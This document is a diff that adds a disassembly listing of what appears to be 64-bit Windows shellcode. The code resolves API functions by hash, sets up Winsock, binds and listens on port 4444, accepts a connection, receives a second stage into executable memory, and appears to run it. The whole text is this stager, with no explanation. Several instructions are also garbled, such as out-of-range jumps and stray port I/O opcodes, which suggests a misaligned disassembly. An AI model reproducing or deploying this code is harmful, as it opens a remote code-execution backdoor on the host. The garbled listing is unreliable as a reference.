@@ -1,0 +1,192 @@
+0: cld 
+1: and rsp, 0xfffffffffffffff0
+8: call 0xd9
+13: push r9
+15: push r8
+17: push rdx
+18: xor rdx, rdx
+21: mov rdx, qword ptr gs:[rdx + 0x60]
+26: mov rdx, qword ptr [rdx + 0x18]
+30: push rcx
+31: push rsi
+32: mov rdx, qword ptr [rdx + 0x20]
+36: mov rsi, qword ptr [rdx + 0x50]
+40: xor r9, r9
+43: movzx rcx, word ptr [rdx + 0x4a]
+48: xor rax, rax
+51: lodsb al, byte ptr [rsi]
+52: cmp al, 0x61
+54: jl 0x3a
+56: sub al, 0x20
+58: ror r9d, 0xd
+62: add r9d, eax
+65: loop 0x30
+67: push rdx
+68: mov rdx, qword ptr [rdx + 0x20]
+72: cmp al, 7
+74: jmp 0x428bb9bb
+79: cmp al, 0x41
+81: push rcx
+82: add rax, rdx
+85: cmp word ptr [rax + 0x18], 0x20b
+91: jne 0xd3
+97: mov eax, dword ptr [rax + 0x88]
+103: test rax, rax
+106: je 0xd3
+108: add rax, rdx
+111: mov ecx, dword ptr [rax + 0x18]
+114: mov r8d, dword ptr [rax + 0x20]
+118: push rax
+119: add r8, rdx
+122: jrcxz 0xd2
+124: dec rcx
+127: xor r9, r9
+130: mov esi, dword ptr [r8 + rcx*4]
+134: add rsi, rdx
+137: jp 0xd9
+139: loope 0xc4
+141: xor rax, rax
+144: ror r9d, 0xd
+148: lodsb al, byte ptr [rsi]
+149: add r9d, eax
+152: and edi, dword ptr [rax]
+154: loopne 0x111
+156: int1 
+157: add r9, qword ptr [rsp + 8]
+162: cmp r9d, r10d
+165: jne 0x7f
+167: std 
+168: int1 
+169: lahf 
+170: adc dword ptr [rdx], ebx
+172: sal dword ptr [rdi + 0x18], cl
+175: pop rax
+176: mov r8d, dword ptr [rax + 0x24]
+180: add r8, rdx
+183: mov cx, word ptr [r8 + rcx*2]
+188: mov r8d, dword ptr [rax + 0x1c]
+192: in al, dx
+194: add r8, rdx
+197: mov eax, dword ptr [r8 + rcx*4]
+201: pop r8
+203: pop r8
+205: pop rsi
+206: pop rcx
+207: add rax, rdx
+210: pop rdx
+211: pop r8
+213: pop r9
+215: pop r10
+217: jp 0x140
+219: xchg esi, eax
+220: sub rsp, 0x20
+224: push r10
+226: jmp rax
+228: pop rax
+229: pop r9
+231: pop rdx
+232: mov rdx, qword ptr [rdx]
+235: jmp 0x3b
+240: pop rbp
+241: movabs r14, 0x32335f327377
+251: push r14
+253: mov r14, rsp
+256: sub rsp, 0x1a0
+263: mov r13, rsp
+266: xor rax, rax
+269: push rax
+270: push rax
+271: mov r12, 0x5c110002
+278: push r12
+280: mov r12, rsp
+283: mov rcx, r14
+286: mov r10d, 0x726774c
+292: call rbp
+294: mov rdx, r13
+297: push 0x101
+302: pop rcx
+303: mov r10d, 0x6b8029
+309: call rbp
+311: push 2
+313: pop rcx
+314: push rax
+315: push rax
+316: xor r9, r9
+319: xor r8, r8
+322: inc rax
+325: mov rdx, rax
+328: mov r10d, 0xe0df0fea
+334: call rbp
+336: mov rdi, rax
+339: push 0x10
+341: pop r8
+343: mov rdx, r12
+346: mov rcx, rdi
+349: mov r10d, 0x6737dbc2
+355: call rbp
+357: xor rdx, rdx
+360: mov rcx, rdi
+363: mov r10d, 0xff38e9b7
+369: call rbp
+371: xor r8, r8
+374: xor rdx, rdx
+377: mov rcx, rdi
+380: mov r10d, 0xe13bec74
+386: call rbp
+388: mov rcx, rdi
+391: mov rdi, rax
+394: mov r10d, 0x614d6e75
+400: call rbp
+402: add rsp, 0x2b0
+409: xor r9, r9
+412: push 0x10
+414: pop r8
+416: call 0x1b5
+421: scasb al, byte ptr [rdi]
+422: jno 0x16f
+425: mov dil, 0x14
+429: in al, 0x42
+431: in al, 0x8a
+433: pop rax
+434: jae 0x54e45742
+440: out 0x32, al
+442: pop rdi
+443: add ch, byte ptr [rdi + 0x5a]
+446: mov rcx, rdi
+449: mov r10, 0x5f38ebc2
+456: call rbp
+458: sub rsp, 0x10
+462: mov rdx, rsp
+465: xor r9, r9
+468: push 4
+470: pop r8
+472: mov rcx, rdi
+475: mov r10d, 0x5fc8d902
+481: call rbp
+483: add rsp, 0x20
+487: pop rsi
+488: mov esi, esi
+490: push 0x40
+492: pop r9
+494: push 0x1000
+499: pop r8
+501: mov rdx, rsi
+504: xor rcx, rcx
+507: mov r10d, 0xe553a458
+513: call rbp
+515: mov rbx, rax
+518: mov r15, rax
+521: xor r9, r9
+524: imul esi, dword ptr [rdi], -0x4c
+527: sal byte ptr [rax + 0x49461797], cl
+533: mov eax, esi
+535: mov rdx, rbx
+538: mov rcx, rdi
+541: mov r10d, 0x5fc8d902
+547: call rbp
+549: add rbx, rax
+552: loope 0x262
+554: jno 0x1d5
+556: fmul dword ptr [rdi + 0x48]
+559: sub esi, eax
+561: leave 
